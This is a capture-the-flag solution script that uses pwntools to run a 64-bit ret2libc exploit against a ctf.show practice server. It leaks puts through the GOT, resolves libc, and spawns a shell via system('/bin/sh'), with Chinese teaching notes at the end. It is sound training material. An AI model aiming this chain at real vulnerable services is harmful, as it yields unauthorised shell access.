from pwn import *
from LibcSearcher import *

context(log_level = 'debug', arch = 'amd64', os = 'linux')

p = remote('pwn.challenge.ctf.show', 28236)
elf = ELF('../code/pwn')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['ctfshow']

pop_rdi = 0x4007e3
ret = 0x4004fe

offset = 0x20 + 8

payload = b'a' * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

p.recvuntil('Hello CTFshow\n')
p.sendline(payload)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:] + b'\x00\x00')

print('puts address --> ', hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)

libcbase = puts_addr - libc.dump('puts')
sys_addr = libcbase + libc.dump('system')
bin_sh_addr = libcbase + libc.dump('str_bin_sh')

payload2 = b'a' * offset + p64(pop_rdi) + p64(bin_sh_addr) + p64(ret) + p64(sys_addr)

p.recvuntil('Hello CTFshow\n')
p.sendline(payload2)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2libc - 64位完整版
2. 完整ROP链构造：
   - 第一次：泄露puts地址
   - 第二次：调用system("/bin/sh")
3. payload结构（第一次）：
   填充 + pop_rdi + puts_got + puts_plt + main_addr
   - pop_rdi给puts传参
   - puts打印自身地址
   - 返回main再次输入
4. payload结构（第二次）：
   填充 + pop_rdi + bin_sh_addr + ret + sys_addr
   - 注意这里有ret gadget用于栈对齐
5. context设置：
   - arch='amd64', os='linux'：指定架构和系统
   - 影响shellcraft等函数的默认行为
6. LibcSearcher vs LibcSearcher3：
   - LibcSearcher是新版，支持更多libc版本
   - 用法相同，都是根据函数地址识别libc
7. 关键点：完整的64位ret2libc流程，包含栈对齐
"""
